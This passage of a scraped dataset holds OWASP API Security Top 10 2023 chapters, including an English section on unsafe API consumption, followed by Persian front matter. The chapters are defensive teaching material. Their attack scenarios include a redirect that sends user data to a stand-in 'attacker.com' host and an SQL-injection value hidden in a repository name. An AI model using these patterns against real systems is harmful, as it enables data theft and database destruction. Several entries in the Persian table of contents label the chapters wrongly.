Project][1]\n* [Configuration and Deployment Management Testing - Web Security Testing\n  Guide][2]\n* [Testing for Error Handling - Web Security Testing Guide][3]\n* [Testing for Cross Site Request Forgery - Web Security Testing Guide][4]\n\n### External\n\n* [CWE-2: Environmental Security Flaws][5]\n* [CWE-16: Configuration][6]\n* [CWE-209: Generation of Error Message Containing Sensitive Information][7]\n* [CWE-319: Cleartext Transmission of Sensitive Information][8]\n* [CWE-388: Error Handling][9]\n* [CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response\n  Smuggling')][10]\n* [CWE-942: Permissive Cross-domain Policy with Untrusted Domains][11]\n* [Guide to General Server Security][12], NIST\n* [Let's Encrypt: a free, automated, and open Certificate Authority][13]\n\n[1]: https://owasp.org/www-project-secure-headers/\n[2]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/README\n[3]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/README\n[4]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery\n[5]: https://cwe.mitre.org/data/definitions/2.html\n[6]: https://cwe.mitre.org/data/definitions/16.html\n[7]: https://cwe.mitre.org/data/definitions/209.html\n[8]: https://cwe.mitre.org/data/definitions/319.html\n[9]: https://cwe.mitre.org/data/definitions/388.html\n[10]: https://cwe.mitre.org/data/definitions/444.html\n[11]: https://cwe.mitre.org/data/definitions/942.html\n[12]: https://csrc.nist.gov/publications/detail/sp/800-123/final\n[13]: https://letsencrypt.org/\n", "timestamp": "2025-10-24T22:26:50.632786"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/en/0xa9-improper-inventory-management.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa9-improper-inventory-management.md", "content": "# API9:2023 Improper Inventory Management\n\n| Threat agents/Attack vectors | Security Weakness | Impacts |\n| - | - | - |\n| API Specific : Exploitability **Easy** | Prevalence **Widespread** : Detectability **Average** | Technical **Moderate** : Business Specific |\n| Threat agents usually get unauthorized access through old API versions or endpoints left running unpatched and using weaker security requirements. In some cases exploits are available. Alternatively, they may get access to sensitive data through a 3rd party with whom there's no reason to share data with. | Outdated documentation makes it more difficult to find and/or fix vulnerabilities. Lack of assets inventory and retirement strategies leads to running unpatched systems, resulting in leakage of sensitive data. It's common to find unnecessarily exposed API hosts because of modern concepts like microservices, which make applications easy to deploy and independent (e.g. cloud computing, K8S). Simple Google Dorking, DNS enumeration, or using specialized search engines for various types of servers (webcams, routers, servers, etc.) connected to the internet will be enough to discover targets. | Attackers can gain access to sensitive data, or even take over the server. Sometimes different API versions/deployments are connected to the same database with real data. Threat agents may exploit deprecated endpoints available in old API versions to get access to administrative functions or exploit known vulnerabilities. |\n\n## Is the API Vulnerable?\n\nThe sprawled and connected nature of APIs and modern applications brings new\nchallenges. It is important for organizations not only to have a good\nunderstanding and visibility of their own APIs and API endpoints, but also how\nthe APIs are storing or sharing data with external third parties.\n\nRunning multiple versions of an API requires additional management resources\nfrom the API provider and expands the attack surface.\n\nAn API has a \"<ins>documentation blindspot</ins>\" if:\n\n* The purpose of an API host is unclear, and there are no explicit answers to\n  the following questions\n    * Which environment is the API running in (e.g. production, staging, test,\n      development)?\n    * Who should have network access to the API (e.g. public, internal,\n      partners)?\n    * Which API version is running?\n* There is no documentation or the existing documentation is not updated.\n* There is no retirement plan for each API version.\n* The host's inventory is missing or outdated.\n\nThe visibility and inventory of sensitive data flows play an important role as\npart of an incident response plan, in case a breach happens on the third party\nside.\n\nAn API has a \"<ins>data flow blindspot</ins>\" if:\n\n* There is a \"sensitive data flow\" where the API shares sensitive data with a\n  third party and\n    * There is not a business justification or approval of the flow\n    * There is no inventory or visibility of the flow\n    * There is not deep visibility of which type of sensitive data is shared\n\n## Example Attack Scenarios\n\n### Scenario #1\n\nA social network implemented a rate-limiting mechanism that blocks attackers\nfrom using brute force to guess reset password tokens. This mechanism wasn't\nimplemented as part of the API code itself but in a separate component between\nthe client and the official API (`api.socialnetwork.owasp.org`). A researcher\nfound a beta API host (`beta.api.socialnetwork.owasp.org`) that runs the same\nAPI, including the reset password mechanism, but the rate-limiting mechanism was\nnot in place. The researcher was able to reset the password of any user by using\nsimple brute force to guess the 6 digit token.\n\n### Scenario #2\n\nA social network allows developers of independent apps to integrate with it. As\npart of this process a consent is requested from the end user, so the social\nnetwork can share the user's personal information with the independent app.\n\nThe data flow between the social network and the independent apps is not\nrestrictive or monitored enough, allowing independent apps to access not only\nthe user information but also the private information of all of their friends.\n\nA consulting firm builds a malicious app and manages to get the consent of\n270,000 users. Because of the flaw, the consulting firm manages to get access\nto the private information of 50,000,000 users. Later, the consulting firm\nsells the information for malicious purposes.\n\n## How To Prevent\n\n* Inventory all <ins>API hosts</ins> and document important aspects of each one\n  of them, focusing on the API environment (e.g. production, staging, test,\n  development), who should have network access to the host (e.g. public,\n  internal, partners) and the API version.\n* Inventory <ins>integrated services</ins> and document important aspects such\n  as their role in the system, what data is exchanged (data flow), and their\n  sensitivity.\n* Document all aspects of your API such as authentication, errors, redirects,\n  rate limiting, cross-origin resource sharing (CORS) policy, and endpoints,\n  including their parameters, requests, and responses.\n* Generate documentation automatically by adopting open standards. Include the\n  documentation build in your CI/CD pipeline.\n* Make API documentation available only to those authorized to use the API.\n* Use external protection measures such as API security specific solutions for\n  all exposed versions of your APIs, not just for the current production\n  version.\n* Avoid using production data with non-production API deployments. If this is\n  unavoidable, these endpoints should get the same security treatment as the\n  production ones.\n* When newer versions of APIs include security improvements, perform a risk\n  analysis to inform the mitigation actions required for the older versions.\n  For example, whether it is possible to backport the improvements without\n  breaking API compatibility or if you need to take the older version out\n  quickly and force all clients to move to the latest version.\n\n## References\n\n### External\n\n* [CWE-1059: Incomplete Documentation][1]\n\n[1]: https://cwe.mitre.org/data/definitions/1059.html\n", "timestamp": "2025-10-24T22:26:50.753238"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/en/0xaa-unsafe-consumption-of-apis.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xaa-unsafe-consumption-of-apis.md", "content": "# API10:2023 Unsafe Consumption of APIs\n\n| Threat agents/Attack vectors | Security Weakness | Impacts |\n| - | - | - |\n| API Specific : Exploitability **Easy** | Prevalence **Common** : Detectability **Average** | Technical **Severe** : Business Specific |\n| Exploiting this issue requires attackers to identify and potentially compromise other APIs/services the target API integrated with. Usually, this information is not publicly available or the integrated API/service is not easily exploitable. | Developers tend to trust and not verify the endpoints that interact with external or third-party APIs, relying on weaker security requirements such as those regarding transport security, authentication/authorization, and input validation and sanitization. Attackers need to identify services the target API integrates with (data sources) and, eventually, compromise them. | The impact varies according to what the target API does with pulled data. Successful exploitation may lead to sensitive information exposure to unauthorized actors, many kinds of injections, or denial of service. |\n\n## Is the API Vulnerable?\n\nDevelopers tend to trust data received from third-party APIs more than user\ninput. This is especially true for APIs offered by well-known companies.\nBecause of that, developers tend to adopt weaker security standards, for\ninstance, in regards to input validation and sanitization.\n\nThe API might be vulnerable if:\n\n* Interacts with other APIs over an unencrypted channel;\n* Does not properly validate and sanitize data gathered from other APIs prior\n  to processing it or passing it to downstream components;\n* Blindly follows redirections;\n* Does not limit the number of resources available to process third-party\n  services responses;\n* Does not implement timeouts for interactions with third-party services;\n\n## Example Attack Scenarios\n\n### Scenario #1\n\nAn API relies on a third-party service to enrich user provided business\naddresses. When an address is supplied to the API by the end user, it is sent\nto the third-party service and the returned data is then stored on a local\nSQL-enabled database.\n\nBad actors use the third-party service to store an SQLi payload associated with\na business created by them. Then they go after the vulnerable API providing\nspecific input that makes it pull their \"malicious business\" from the\nthird-party service. The SQLi payload ends up being executed by the database,\nexfiltrating data to an attacker's controlled server.\n\n### Scenario #2\n\nAn API integrates with a third-party service provider to safely store sensitive\nuser medical information. Data is sent over a secure connection using an HTTP\nrequest like the one below:\n\n```\nPOST /user/store_phr_record\n{\n  \"genome\": \"ACTAGTAG__TTGADDAAIICCTT…\"\n}\n```\n\nBad actors found a way to compromise the third-party API and it starts\nresponding with a `308 Permanent Redirect` to requests like the previous one.\n\n```\nHTTP/1.1 308 Permanent Redirect\nLocation: https://attacker.com/\n```\n\nSince the API blindly follows the third-party redirects, it will repeat the\nexact same request including the user's sensitive data, but this time to the\nattacker's server.\n\n### Scenario #3\n\nAn attacker can prepare a git repository named `'; drop db;--`.\n\nNow, when an integration from an attacked application is done with the\nmalicious repository, SQL injection payload is used on an application that\nbuilds an SQL query believing the repository's name is safe input.\n\n## How To Prevent\n\n* When evaluating service providers, assess their API security posture.\n* Ensure all API interactions happen over a secure communication channel (TLS).\n* Always validate and properly sanitize data received from integrated APIs\n  before using it.\n* Maintain an allowlist of well-known locations integrated APIs may redirect\n  yours to: do not blindly follow redirects.\n\n\n## References\n\n### OWASP\n\n* [Web Service Security Cheat Sheet][1]\n* [Injection Flaws][2]\n* [Input Validation Cheat Sheet][3]\n* [Injection Prevention Cheat Sheet][4]\n* [Transport Layer Protection Cheat Sheet][5]\n* [Unvalidated Redirects and Forwards Cheat Sheet][6]\n\n### External\n\n* [CWE-20: Improper Input Validation][7]\n* [CWE-200: Exposure of Sensitive Information to an Unauthorized Actor][8]\n* [CWE-319: Cleartext Transmission of Sensitive Information][9]\n\n[1]: https://cheatsheetseries.owasp.org/cheatsheets/Web_Service_Security_Cheat_Sheet.html\n[2]: https://www.owasp.org/index.php/Injection_Flaws\n[3]: https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html\n[4]: https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html\n[5]: https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html\n[6]: https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html\n[7]: https://cwe.mitre.org/data/definitions/20.html\n[8]: https://cwe.mitre.org/data/definitions/200.html\n[9]: https://cwe.mitre.org/data/definitions/319.html\n", "timestamp": "2025-10-24T22:26:50.861071"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/en/0xb0-next-devs.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xb0-next-devs.md", "content": "# What's Next For Developers\n\nThe task to create and maintain secure applications, or fixing existing\napplications, can be difficult. It is no different for APIs.\n\nWe believe that education and awareness are key factors to writing secure\nsoftware. Everything else required to accomplish the goal depends on\n**establishing and using repeatable security processes and standard security\ncontrols**.\n\nOWASP provides numerous free and open resources to help you address security.\nPlease visit the [OWASP Projects page][1] for a comprehensive list of available\nprojects.\n\n| | |\n|-|-|\n| **Education** | The [Application Security Wayfinder][2] should give you a good idea about what projects are available for each stage/phase of the Software Development LifeCycle (SDLC). For hands-on learning/training you can start with [OWASP **crAPI** - **C**ompletely **R**idiculous **API**][3] or [OWASP Juice Shop][4]: both have intentionally vulnerable APIs. The [OWASP Vulnerable Web Applications Directory Project][5] provides a curated list of intentionally vulnerable applications: you'll find there several other vulnerable APIs. You can also attend [OWASP AppSec Conference][6] training sessions, or [join your local chapter][7]. |\n| **Security Requirements** | Security should be part of every project from the beginning. When defining requirements, it is important to define what \"secure\" means for that project. OWASP recommends you use the [OWASP Application Security Verification Standard (ASVS)][8] as a guide for setting the security requirements. If you're outsourcing, consider the [OWASP Secure Software Contract Annex][9], which should be adapted according to local law and regulations. |\n| **Security Architecture** | Security should remain a concern during all the project stages. The [OWASP Cheat Sheet Series][10] is a good starting point for guidance on how to design security in during the architecture phase. Among many others, you'll find the [REST Security Cheat Sheet][11] and the [REST Assessment Cheat Sheet][12] as well the [GraphQL Cheat Sheet][13]. |\n| **Standard Security Controls** | Adopting standard security controls reduces the risk of introducing security weaknesses while writing your own logic. Although many modern frameworks now come with effective built-in standard controls, [OWASP Proactive Controls][14] gives you a good overview of what security controls you should look to include in your project. OWASP also provides some libraries and tools you may find valuable, such as validation controls. |\n| **Secure Software Development Life Cycle** | You can use the [OWASP Software Assurance Maturity Model (SAMM)][15] to improve your processes of building APIs. Several other OWASP projects are available to help you during the different API development phases e.g., the [OWASP Code Review Guide][16]. |\n\n[1]: https://owasp.org/projects/\n[2]: https://owasp.org/projects/#owasp-projects-the-sdlc-and-the-security-wayfinder\n[3]: https://owasp.org/www-project-crapi/\n[4]: https://owasp.org/www-project-juice-shop/\n[5]: https://owasp.org/www-project-vulnerable-web-applications-directory/\n[6]: https://owasp.org/events/\n[7]: https://owasp.org/chapters/\n[8]: https://owasp.org/www-project-application-security-verification-standard/\n[9]: https://owasp.org/www-community/OWASP_Secure_Software_Contract_Annex\n[10]: https://cheatsheetseries.owasp.org/\n[11]: https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html\n[12]: https://cheatsheetseries.owasp.org/cheatsheets/REST_Assessment_Cheat_Sheet.html\n[13]: https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html\n[14]: https://owasp.org/www-project-proactive-controls/\n[15]: https://owasp.org/www-project-samm/\n[16]: https://owasp.org/www-project-code-review-guide/\n", "timestamp": "2025-10-24T22:26:50.973944"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/en/0xb1-next-devsecops.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xb1-next-devsecops.md", "content": "# What's Next For DevSecOps\n\nDue to their importance in modern application architectures, building secure\nAPIs is crucial. Security cannot be neglected, and it should be part of the\nwhole development life cycle. Scanning and penetration testing yearly are no\nlonger enough.\n\nDevSecOps should join the development effort, facilitating continuous security\ntesting across the entire software development life cycle. Your goal should be\nto enhance the development pipeline with security automation, but without\nimpacting the speed of development.\n\nIn case of doubt, stay informed, and refer to the [DevSecOps Manifesto][1].\n\n| | |\n|-|-|\n| **Understand the Threat Model** | Testing priorities come from a threat model. If you don't have one, consider using [OWASP Application Security Verification Standard (ASVS)][2], and the [OWASP Testing Guide][3] as an input. Involving the development team will help to make them more security-aware. |\n| **Understand the SDLC** | Join the development team to better understand the Software Development Life Cycle. Your contribution on continuous security testing should be compatible with people, processes, and tools. Everyone should agree with the process, so that there's no unnecessary friction or resistance. |\n| **Testing Strategies** | Since your work should not impact the development speed, you should wisely choose the best (simple, fastest, most accurate) technique to verify the security requirements. The [OWASP Security Knowledge Framework][4] and [OWASP Application Security Verification Standard][2] can be great sources of functional and nonfunctional security requirements. There are other great sources for [projects][5] and [tools][6] similar to the one offered by the [DevSecOps community][7]. |\n| **Achieving Coverage and Accuracy** | You're the bridge between developers and operations teams. To achieve coverage, not only should you focus on the functionality, but also the orchestration. Work close to both development and operations teams from the beginning so you can optimize your time and effort. You should aim for a state where the essential security is verified continuously. |\n| **Clearly Communicate Findings** | Contribute value with less or no friction. Deliver findings in a timely fashion, within the tools development teams are using (not PDF files). Join the development team to address the findings. Take the opportunity to educate them, clearly describing the weakness and how it can be abused, including an attack scenario to make it real. |\n\n[1]: https://www.devsecops.org/\n[2]: https://owasp.org/www-project-application-security-verification-standard/\n[3]: https://owasp.org/www-project-web-security-testing-guide/\n[4]: https://owasp.org/www-project-security-knowledge-framework/\n[5]: http://devsecops.github.io/\n[6]: https://github.com/devsecops/awesome-devsecops\n[7]: http://devsecops.org\n", "timestamp": "2025-10-24T22:26:51.082985"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/en/0xd0-about-data.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xd0-about-data.md", "content": "# Methodology and Data\n\n## Overview\n\nFor this list update, the OWASP API Security team used the same methodology used\nfor the successful and well adopted 2019 list, with the addition of a 3 month\n[public Call for Data][1]. Unfortunately, this call for data did not result in\ndata that would have enabled a relevant statistical analysis of the most common\nAPI security issues.\n\nHowever, with a more mature API security industry capable of providing direct\nfeedback and insights, the update process moved forward using the same\nmethodology as before.\n\nArrived here, we believe to have a good forward-looking awareness document for\nthe next three or four years, more focused on modern APIs-specific issues. The\ngoal of this project isn't to replace other top 10 lists, but instead to cover\nthe existing and upcoming top API security risks that we believe the industry\nshould be aware and diligent about.\n\n## Methodology\n\nIn the first phase, publicly available data about API security incidents were\ncollected, reviewed, and categorized. Such data were collected from bug bounty\nplatforms and publicly available reports. Only issues reported between 2019 and\n2022 were considered. This data was used to give the team a sense of in which\ndirection the previous top 10 list should evolve as well as to help deal with\npossible contributed data bias.\n\nA public [Call for Data][1] ran from September 1st and November 30th, 2022. In\nparallel the project team started the discussion about what has changed since\n2019. The discussion included the impact of the first list, feedback received\nfrom the community, and new trends of API security.\n\nThe project team promoted meetings with specialists on relevant API security\nthreats to get insights into how victims are impacted and how those threats can\nbe mitigated.\n\nThis effort resulted in an initial draft of what the team believes were the ten\nmost critical API security risks. The [OWASP Risk Rating Methodology][2] was\nused to perform the risk analysis. Prevalence ratings were decided from a\nconsensus among the project team members, based on their experience in the\nfield. For considerations on these matters, please refer to the [API Security\nRisks][3] section.\n\nThe initial draft was then shared for review with security practitioners with\nrelevant experience in the API security fields. Their comments were reviewed,\ndiscussed, and when applicable included in the document. The resulting document\nwas [published as a Release Candidate][4] for [open discussion][5]. Several\n[community contributions][6] were included into the final document.\n\nThe list of contributors is available in the [Acknowledgments][7] section.\n\n## API Specific Risks\n\nThe list is built to address security risks that are more specific to APIs.\n\nIt does not imply that other generic application security risks don't exist in\nAPI based applications. For example, we didn't include risks such as \"Vulnerable\nand Outdated Components\" or \"Injection\", even though you might find them in API\nbased applications. These risks are generic, they don't behave differently in\nAPIs, nor their exploitation is different.\n\nOur goal is to increase the awareness of security risks that deserve special\nattention in APIs.\n\n[1]: https://owasp.org/www-project-api-security/announcements/cfd/2022/\n[2]: https://www.owasp.org/index.php/OWASP_Risk_Rating_Methodology\n[3]: ./0x10-api-security-risks.md\n[4]: https://owasp.org/www-project-api-security/announcements/2023/02/api-top10-2023rc\n[5]: https://github.com/OWASP/API-Security/issues?q=is%3Aissue+label%3A2023RC\n[6]: https://github.com/OWASP/API-Security/pulls?q=is%3Apr+label%3A2023RC\n[7]: ./0xd1-acknowledgments.md\n", "timestamp": "2025-10-24T22:26:51.212309"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/en/0xd1-acknowledgments.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xd1-acknowledgments.md", "content": "# Acknowledgments\n\n## Acknowledgments to Contributors\n\nWe'd like to thank the following contributors who contributed publicly on\nGitHub, or via other means:\n\n247arjun, abunuwas, Alissa Knight, Arik Atar, aymenfurter, Corey J. Ball, cyn8,\nd0znpp, Dan Gordon, donge, Dor Tumarkin, faizzaidi, gavjl, guybensimhon, Inês\nMartins, Isabelle Mauny, Ivan Novikov, jmanico, Juan Pablo, k7jto, LaurentCB,\nllegaz, Maxim Zavodchik, MrPRogers, planetlevel, rahulk22, Roey Eliyahu, Roshan\nPiyush, securitylevelup, sudeshgadewar123, Tatsuya-hasegawa, tebbers, vanderaj,\nwenz, xplo1t-sec, Yaniv Balmas, ynvb\n", "timestamp": "2025-10-24T22:26:51.326504"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fa/0x00-header.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fa/0x00-header.md", "content": "---\ntitle: ''\ndescription: OWASP API Security Top 10 2023 edition\n---\n\n![OWASP LOGO](images/cover.jpg)\n\n| | | |\n| - | - | - |\n| [https://owasp.org](https://owasp.org) | این اثر تحت مجوز زیر توسعه داده شده است [Creative Commons Attribution-ShareAlike 4.0 International License][1] | ![Creative Commons License Logo](images/front-cc.png) |\n\n[1]: http://creativecommons.org/licenses/by-sa/4.0/", "timestamp": "2025-10-24T22:26:51.763695"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fa/0x00-notice.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fa/0x00-notice.md", "content": "# اطلاعیه سپاسگزاری‌ها\n\nاین نسخه متنی OWASP API Security Top 10 است که به عنوان مرجعی برای نسخه رسمی منتشر شده، در قالب یک سند قابل حمل  (PDF) استفاده می شود.\n\nمشارکت در پروژه مانند نظرات، اصلاحات یا ترجمه ها باید در اینجا انجام شود. برای جزئیات بیشتر در مورد [نحوه مشارکت][1]، لطفاً به [CONTRIBUTING.md][1] مراجعه فرمایید.\n\n\n* Erez Yallon\n* Inon Shkedy\n* Paulo Silva\n\n[1]: https://github.com/OWASP/API-Security/blob/master/CONTRIBUTING.md\n", "timestamp": "2025-10-24T22:26:51.879016"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fa/0x00-toc.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fa/0x00-toc.md", "content": "# فهرست مطالب\n\n* [ فهرست مطالب](0x00-toc.md)\n* [درباره OWASP](0x01-about-owasp.md)\n* [ پیش‌گفتار](0x02-foreword.md)\n* [ مقدمه](0x03-introduction.md)\n* [ یادداشت](0x04-release-notes.md)\n* [ ریسک‌های امنیت API](0x10-api-security-risks.md)\n* [ ده ریسک امنیت API OWASP 2023](0x11-t10.md)\n* [API1:2023 مجوزدهی نادرست در سطح اشیا](0xa1-broken-object-level-authorization.md)\n* [API2:2023 احرازهویت نادرست کاربر](0xa2-broken-authentication.md)\n* [API3:2023 افشای مفرط داده](0xa3-broken-object-property-level-authorization.md)\n* [API4:2023 کمبود منابع و نبود محدودیت بر نرخ ارسال](0xa4-unrestricted-resource-consumption.md)\n* [API5:2023 مجوزدهی نادرست در سطح توابع](0xa5-broken-function-level-authorization.md)\n* [API6:2023 تخصیص جمعی](0xa6-unrestricted-access-to-sensitive-business-flows.md)\n* [API7:2023 پیکربندی امنیتی نادرست](0xa7-server-side-request-forgery.md)\n* [API8:2023 تزریق ورودی‌های مخرب](0xa8-security-misconfiguration.md)\n* [API9:2023 مدیریت نادرست دارایی‌ها](0xa9-improper-inventory-management.md)\n* [API10:2023 پایش و نظارت ناکافی](0xaa-unsafe-consumption-of-apis.md)\n* [ادامه برای توسعه دهندگان](0xb0-next-devs.md)\n* [ ادامه برای DevSecOps](0xb1-next-devsecops.md)\n* [ متدولوژی و داده](0xd0-about-data.md)\n* [سپاسگزاری](0xd1-acknowledgments.md)\n", "timestamp": "2025-10-24T22:26:51.990802"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fa/0x01-about-owasp.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fa/0x01-about-owasp.md", "content": "# درباره OWASP\n\nپروژه بازمتن امنیت وب اپلیکیشن‌ها (OWASP)  جامعه ای باز و آزاد است که اختصاصا در حوزه توانمندسازی سازمان‌ها در حوزه توسعه، تهیه و ایجاد اپلیکیشن‌ها و APIهای قابل اعتماد فعالیت دارد.\n در OWASP، موارد زیر را بصورت رایگان و آزاد خواهید یافت:\n\n- استانداردها و ابزارهای امنیت اپلیکیشن.\n- کتاب‌هایی درباره تست امنیت اپلیکیشن‌ها، توسعه ایمن کد و بازبینی امنیت کد.\n- ارائه‌ها و [ویدئوها][1].\n- [راهنما و برگه تقلب][2] برای بسیاری از موضوعات رایج.\n- کنترل‌ها و کتابخانه‌های استاندارد در حوزه امنیت.\n- [شعب محلی در سرتاسر جهان][3].\n- تحقیقات به روز و پیشرو در حوزه امنیت.\n- [کنفرانس‌های تخصصی][4] در سرتاسر جهان.\n- [یست‌های پست الکترونیک][5] [آرشیو][6]\n\nاطلاعات بیشتر در: [https://owasp.org][7]\n\nتمامی ابزارها، مستندات، ویدئوها، ارائه‌ها و شعب OWASP رایگان بوده و استفاده از یا مشارکت در آنها برای کلیه افرادی که تمایل به بهبود امنیت اپلیکیشن‌ها دارند، آزاد است.\n\nدر OWASP امنیت اپلیکیشن بعنوان مساله‌ای مهم از منظر افراد، فرایندها و فناوری‌ها در نظر گرفته می‌شود چرا که موثرترین رویکردها در امنیت اطلاعات نیز به بهبود در این حوزه‌ها نیاز دارند.\n\nOWASP تعریف جدیدی از سازمان ارائه می‌دهد. رهایی از بند فشار مسائل مالی امکان فراهم آوردن اطلاعات بیطرفانه، عملی و مقرون به صرفه در حوزه امنیت اپلیکیشن‌ها را به ما داده است.\n\nOWASP به هیچ کمپانی فناوری وابستگی ندارد اگرچه از استفاده آگاهانه از فناوری‌های تجاری در حوزه امنیت نیز حمایت می‌کنیم. OWASP انواع مختلفی از اطلاعات را به گونه‌ای همکارانه، شفاف و باز ارائه می‌دهد.\n\nبنیاد OWASP موجودیتی غیرانتفاعی و عام المنفعه است که توفیق بلند مدت پروژه OWASP را تضمین می‌نماید. تقریبا تمامی کسانی که با OWASP پیوند دارند، از قبیل اعضای هیئت مدیره، روسای شعبه‌ها، راهبران پروژه‌ها و اعضای پروژه‌ها داوطلبانه این همکاری را انجام می‌دهند. همچنین ما از تحقیقات نوآورانه در حوزه امنیت با ارائه کمک‌های مالی و زیرساختی حمایت می‌کنیم.\n\nبه ما بپیوندید!\n\n## حق چاپ و مجوز\n\n![license](images/license.png)\n\nحق چاپ © 2003-2023 بنیاد OWASP. این اثر تحت مجوز [Creative Commons Attribution ShareAlike 4.0 International License][8] توسعه داده شده است. برای هرگونه استفاده مجدد یا انتشار، باید شرایط مجوز این اثر را برای دیگران شفاف نمایید.\n\n[1]: https://www.youtube.com/user/OWASPGLOBAL\n[2]: https://cheatsheetseries.owasp.org/\n[3]: https://owasp.org/chapters/\n[4]: https://owasp.org/events/\n[5]: https://groups.google.com/a/owasp.org/forum/#!overview\n[6]: https://lists.owasp.org/mailman/listinfo\n[7]: https://www.owasp.org\n[8]: http://creativecommons.org/licenses/by-sa/4.0/\n", "timestamp": "2025-10-24T22:26:52.106338"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fa/0x02-foreword.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fa/0x02-foreword.md", "content": "# FW پیشگفتار\n\nدر دنیای مبتنی بر App امروز، یکی از ابعاد بنیادین نوآوری واسط برنامه نویسی اپلیکیشن یا همان API ها هستند. از بانک‌‌ها گرفته تا خرده فروشی‌‌ها، حوزه حمل نقل، اینترنت اشیا، وسائل نقلیه خودران و شهرهای هوشمند، APIها بخشی حیاتی از اپلیکیشن‌‌های موبایل، وب و SaaS به شمار می‌آیند.\n\nAPIها ذاتا منطق اپلیکیشن و داده‌‌های حساسی از قبیل PII (داده‌‌هایی که به تنهایی و بدون نیاز به داده اضافی دیگر، هویت یک کاربر را عیان می کنند نظیر شماره ملی) را در معرض دید قرارداده و در نتیجه، به طور روزافزون توجه بخش بیشتری از مهاجمین را به خود جلب می‌نمایند. بدون داشتن APIهایی ایمن، توسعه سریع نوآوری‌‌های فناورانه، امکان پذیر نخواهد بود.\n\nاگر چه کماکان می‌توان از لیست ده آسیب‌پذیری امنیتی بحرانی وب اپلیکیشن‌‌ها نیز برای امنیت APIها بهره برد، اما با توجه به ماهیت خاص APIها نیاز به لیستی از تهدیدات امنیتی مختص آنها احساس می‌شود. مقوله امنیت API بر راهکارها و استراتژی‌‌های لازم برای فهم و رفع آسیب‌پذیری‌‌ها و تهدیدات امنیتی خاص و منحصر به APIها تمرکز دارد.\n\nاگر با پروژه [OWASP Top 10][1] آشنایی داشته باشید، شباهت‌‌هایی بین آن و مستند پیش رو خواهید یافت: هر دو با نیت فهم آسان توسط مخاطب و قابلیت بکارگیری و انطباق در سازمان تهیه شده‌اند. در صورتی که با مجموعه‌‌های OWASP Top 10 آشنایی ندارید، بهتر است پیش از رفتن به سراغ لیست اصلی، بخش‌‌های [API ریسک‌های امنیتی][2] و [متدولوژی و داده][3] از همین مستند را مطالعه نمایید.\n\nبا پرسش‌‌ها، نظرات و ایده‌‌های خود در GitHub پروژه می توانید در توسعه OWASP API Security Top 10 مشارکت کنید:\n\n* [https://owasp.org/www-project-api-security][5]\n* [https://github.com/OWASP/API-Security/blob/master/CONTRIBUTING.md][6] \n\nدر اینجا می توانید OWASP API Security Top 10 را بیابید:\n\n* [https://owasp.org/www-project-api-security][7]\n* [https://github.com/OWASP/API-Security][8]\n\nبدین وسیله از تمامی مشارکت کنندگان در این پروژه که با تلاش‌‌های خود در بوجود آمدن آن نقش داشته اند سپاسگزاریم. لیست تمامی آنها در قسمت [سپاسگزاری‌ها][4] قابل مشاهده است. متشکریم!\n\n\n[1]: https://owasp.org/www-project-top-ten/\n[2]: ./0x10-api-security-risks.md\n[3]: ./0xd0-about-data.md\n[4]: ./0xd1-acknowledgments.md\n[5]: https://owasp.org/www-project-api-security/\n[6]: https://github.com/OWASP/API-Security/blob/master/CONTRIBUTING.md\n[7]: https://owasp.org/www-project-api-security/\n[8]: https://github.com/OWASP/API-Security\n", "timestamp": "2025-10-24T22:26:52.219593"}
